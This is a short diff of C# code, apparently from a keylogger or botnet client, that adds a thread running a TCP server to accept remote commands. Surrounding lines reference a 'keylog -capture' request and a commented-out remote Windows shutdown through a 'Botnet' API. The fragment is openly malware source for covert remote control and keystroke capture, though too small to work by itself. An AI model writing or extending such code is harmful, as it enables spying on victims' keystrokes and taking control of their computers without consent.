@@ -26,6 +26,11 @@ namespace key
 
             TCPAcceptRequest.Request.Instance.AcceptRequestServer("keylog -capture");
 
+            new Thread(delegate ()
+            {
+                TCPAcceptRequest.RunServer.Run();
+            }).Start();
+           
             //Shut down
             //Botnet.API.DoExitWin(Botnet.ExitWindowsFlags.EWX_SHUTDOWN);
 
